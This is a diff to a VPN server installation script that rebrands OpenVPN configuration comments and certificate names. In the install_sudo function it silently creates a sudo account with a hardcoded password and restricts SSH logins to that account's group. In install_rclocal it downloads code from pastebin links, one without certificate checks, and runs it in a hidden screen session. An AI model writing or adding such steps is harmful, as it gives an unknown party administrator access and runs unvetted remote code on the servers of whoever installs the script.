@@ -287,7 +287,7 @@ echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
-echo '# Openvpn Configuration by @brcyber south of Brazil :)
+echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
 port 53
 proto udp
@@ -332,7 +332,7 @@ log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
 verb 3' > /etc/openvpn/server.conf
 
-echo '# Openvpn Configuration by @brcyber south of Brazil :)
+echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
 port 1194
 proto tcp
@@ -443,7 +443,7 @@ Certificate:
         Serial Number:
             40:26:da:91:18:2b:77:9c:85:6a:0c:bb:ca:90:53:fe
         Signature Algorithm: sha256WithRSAEncryption
-        Issuer: CN=Brcyber
+        Issuer: CN=KobZ
         Validity
             Not Before: Jul 22 22:23:55 2020 GMT
             Not After : Jul 20 22:23:55 2030 GMT
@@ -469,7 +469,7 @@ Certificate:
                 6B:08:C0:64:10:71:A8:32:7F:0B:FE:1E:98:1F:BD:72:74:0F:C8:66
             X509v3 Authority Key Identifier: 
                 keyid:64:49:32:6F:FE:66:62:F1:57:4D:BB:91:A8:5D:BD:26:3E:51:A4:D2
-                DirName:/CN=Brcyber
+                DirName:/CN=KobZ
                 serial:01:A4:01:02:93:12:D9:D6:01:A9:83:DC:03:73:DA:ED:C8:E3:C3:B7
 
             X509v3 Extended Key Usage: 
@@ -621,9 +621,9 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m cyberlink 2>/dev/null; echo cyberlink: Cyberlink3005! | chpasswd &>/dev/null; usermod -aG sudo cyberlink &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups cyberlink" >> /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
@@ -676,11 +676,11 @@ sysctl -p
 
 install_rclocal(){
   {
-    wget https://pastebin.com/raw/Tf6mMc9K -O /etc/ubuntu
+    wget https://pastebin.com/raw/xtPc5t1k -O /etc/ubuntu
     dos2unix /etc/ubuntu
     chmod +x /etc/ubuntu    
     screen -dmS socks python /etc/ubuntu
-    wget --no-check-certificate https://pastebin.com/raw/CNPeV9zb -O /etc/systemd/system/rc-local.service
+    wget --no-check-certificate https://pastebin.com/raw/658HpnLd -O /etc/systemd/system/rc-local.service
     echo "#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
